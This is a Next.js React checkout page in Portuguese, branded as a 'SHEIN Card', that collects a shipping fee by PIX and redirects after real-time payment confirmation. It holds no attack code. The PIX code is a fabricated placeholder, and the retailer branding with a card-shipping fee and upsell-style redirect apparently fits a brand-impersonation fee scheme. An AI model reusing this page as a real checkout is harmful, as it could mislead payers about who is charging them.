"use client"

import { useState, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Button } from "@/components/ui/button"
import { CheckCircle, Clock, RefreshCw, Wifi, WifiOff, AlertCircle, Copy } from "lucide-react"
import { useRealtimePaymentMonitor } from "@/hooks/use-realtime-payment-monitor"
import Image from "next/image"

function CheckoutContent() {
  const searchParams = useSearchParams()

  // Tentar obter external_id de diferentes parâmetros
  const externalId =
    searchParams.get("external_id") ||
    searchParams.get("id") ||
    searchParams.get("externalId") ||
    "SHEIN_1751350461481_922teqg5i" // Fallback para teste

  const amount = searchParams.get("amount") || "27.97"
  const [paymentConfirmed, setPaymentConfirmed] = useState(false)
  const [paymentDenied, setPaymentDenied] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [copied, setCopied] = useState(false)

  const {
    isConnected,
    isConnecting,
    error,
    currentStatus,
    connectionAttempts,
    maxReconnectAttempts,
    isReady,
    reconnect,
  } = useRealtimePaymentMonitor({
    externalId,
    enabled: true,
    debug: true,
    autoRedirect: true,
    redirectUrl: "/upp/001",
    onPaymentConfirmed: (payment) => {
      console.log("🎉 Pagamento confirmado!", payment)
      setPaymentConfirmed(true)
      setShowSuccess(true)
    },
    onPaymentDenied: (payment) => {
      console.log("❌ Pagamento negado!", payment)
      setPaymentDenied(true)
    },
  })

  const getConnectionStatus = () => {
    if (isConnecting) return { color: "yellow", text: "Conectando...", icon: RefreshCw }
    if (isConnected) return { color: "green", text: "Conectado", icon: Wifi }
    if (error) return { color: "red", text: "Erro de Conexão", icon: WifiOff }
    return { color: "gray", text: "Desconectado", icon: WifiOff }
  }

  const connectionStatus = getConnectionStatus()
  const ConnectionIcon = connectionStatus.icon

  const copyExternalId = async () => {
    try {
      await navigator.clipboard.writeText(externalId)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch (error) {
      console.log("❌ Erro ao copiar:", error)
    }
  }

  // Gerar QR Code PIX de exemplo
  const pixCode = `00020126580014br.gov.bcb.pix2536pix.example.com/qr/v2/${externalId}520400005303986540${amount}5802BR5909SHEIN5011SAO PAULO62070503***6304ABCD`

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-md mx-auto space-y-6">
        {/* Header */}
        <div className="text-center">
          <Image src="/shein-card-logo-new.png" alt="SHEIN Card" width={100} height={60} className="mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Aguardando confirmação...</h1>
          <div className="flex items-center justify-center gap-2">
            <span className="text-gray-600 text-sm">External ID:</span>
            <code className="bg-gray-100 px-2 py-1 rounded text-xs font-mono">{externalId}</code>
            <Button onClick={copyExternalId} variant="ghost" size="sm" className="h-6 w-6 p-0">
              {copied ? <CheckCircle className="h-3 w-3 text-green-500" /> : <Copy className="h-3 w-3" />}
            </Button>
          </div>
        </div>

        {/* Status de Conexão */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="flex items-center gap-2 text-sm">
              <ConnectionIcon
                className={`h-4 w-4 ${
                  connectionStatus.color === "green"
                    ? "text-green-500"
                    : connectionStatus.color === "yellow"
                      ? "text-yellow-500 animate-spin"
                      : connectionStatus.color === "red"
                        ? "text-red-500"
                        : "text-gray-500"
                }`}
              />
              Status da Conexão Realtime
            </CardTitle>
          </CardHeader>
          <CardContent className="pt-0">
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-600">{connectionStatus.text}</span>
              <Badge
                variant={
                  connectionStatus.color === "green"
                    ? "default"
                    : connectionStatus.color === "yellow"
                      ? "secondary"
                      : "destructive"
                }
              >
                {isReady ? "Pronto" : "Aguardando"}
              </Badge>
            </div>

            {connectionAttempts > 0 && (
              <div className="mt-2 text-xs text-gray-500">
                Tentativas: {connectionAttempts}/{maxReconnectAttempts}
              </div>
            )}

            {error && (
              <Alert className="mt-3 border-red-200 bg-red-50">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription className="text-sm">{error}</AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>

        {/* Status do Pagamento */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              {paymentConfirmed ? (
                <CheckCircle className="h-5 w-5 text-green-500" />
              ) : (
                <Clock className="h-5 w-5 text-blue-500" />
              )}
              {paymentConfirmed ? "Pagamento Confirmado!" : "Aguardando Pagamento"}
            </CardTitle>
            <CardDescription>
              {paymentConfirmed
                ? "Seu pagamento foi processado com sucesso!"
                : "Escaneie o QR Code ou use o código PIX para pagar"}
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              <div className="text-center">
                <div className="text-3xl font-bold text-gray-900">R$ {amount}</div>
                <div className="text-sm text-gray-500">Frete PAC - Cartão SHEIN</div>
              </div>

              {currentStatus && (
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Status:</span>
                    <Badge
                      variant={
                        currentStatus.is_paid ? "default" : currentStatus.is_denied ? "destructive" : "secondary"
                      }
                    >
                      {currentStatus.status_title}
                    </Badge>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Valor:</span>
                    <span className="font-medium">R$ {currentStatus.amount.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Gateway:</span>
                    <span>{currentStatus.payment_gateway}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-500">Última atualização:</span>
                    <span className="text-xs">{new Date(currentStatus.updated_at).toLocaleTimeString("pt-BR")}</span>
                  </div>
                </div>
              )}
            </div>
          </CardContent>
        </Card>

        {/* QR Code */}
        {!paymentConfirmed && (
          <Card>
            <CardHeader>
              <CardTitle>Escaneie o QR Code PIX</CardTitle>
            </CardHeader>
            <CardContent className="text-center">
              <div className="bg-white p-4 rounded-lg border-2 border-gray-200 inline-block">
                <div className="w-48 h-48 bg-gray-100 rounded flex items-center justify-center">
                  <div className="text-center">
                    <div className="text-4xl mb-2">📱</div>
                    <div className="text-sm text-gray-600">QR Code PIX</div>
                    <div className="text-xs text-gray-500 mt-1">R$ {amount}</div>
                  </div>
                </div>
              </div>
              <p className="text-sm text-gray-600 mt-4">Escaneie o QR Code com seu app do banco</p>
            </CardContent>
          </Card>
        )}

        {/* Código PIX */}
        {!paymentConfirmed && (
          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Ou copie o código PIX:</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="bg-gray-100 p-3 rounded text-xs font-mono break-all">{pixCode}</div>
              <Button
                onClick={() => navigator.clipboard.writeText(pixCode)}
                variant="outline"
                size="sm"
                className="w-full mt-2"
              >
                <Copy className="h-4 w-4 mr-2" />
                Copiar Código PIX
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Instruções */}
        {!paymentConfirmed && (
          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Como pagar:</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2 text-sm text-gray-600">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 bg-blue-500 text-white rounded-full flex items-center justify-center text-xs">
                  1
                </div>
                <span>Abra o app do seu banco</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 bg-blue-500 text-white rounded-full flex items-center justify-center text-xs">
                  2
                </div>
                <span>Escaneie o QR Code ou cole o código PIX</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 bg-blue-500 text-white rounded-full flex items-center justify-center text-xs">
                  3
                </div>
                <span>Confirme o pagamento</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 bg-green-500 text-white rounded-full flex items-center justify-center text-xs">
                  4
                </div>
                <span>Aguarde a confirmação automática em tempo real</span>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Botão de Reconexão */}
        {error && connectionAttempts < maxReconnectAttempts && (
          <Button onClick={reconnect} className="w-full bg-transparent" variant="outline">
            <RefreshCw className="h-4 w-4 mr-2" />
            Tentar Reconectar
          </Button>
        )}

        {/* Mensagem de Sucesso */}
        {showSuccess && (
          <Alert className="border-green-200 bg-green-50">
            <CheckCircle className="h-4 w-4" />
            <AlertDescription>
              <strong>Pagamento confirmado!</strong> Você será redirecionado automaticamente em instantes...
            </AlertDescription>
          </Alert>
        )}

        {/* Debug Info */}
        {process.env.NODE_ENV === "development" && (
          <Card>
            <CardHeader>
              <CardTitle className="text-sm">🔧 Debug Info</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="text-xs space-y-1 font-mono">
                <div>External ID: {externalId}</div>
                <div>Amount: {amount}</div>
                <div>Connected: {isConnected ? "✅" : "❌"}</div>
                <div>Ready: {isReady ? "✅" : "❌"}</div>
                <div>Current Status: {currentStatus ? "✅" : "❌"}</div>
                {currentStatus && (
                  <div className="mt-2 p-2 bg-gray-100 rounded">
                    <div>Status Code: {currentStatus.status_code}</div>
                    <div>Is Paid: {currentStatus.is_paid ? "✅" : "❌"}</div>
                    <div>Amount: R$ {currentStatus.amount}</div>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}

export default function CheckoutPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
          <RefreshCw className="h-8 w-8 animate-spin text-blue-500" />
        </div>
      }
    >
      <CheckoutContent />
    </Suspense>
  )
}
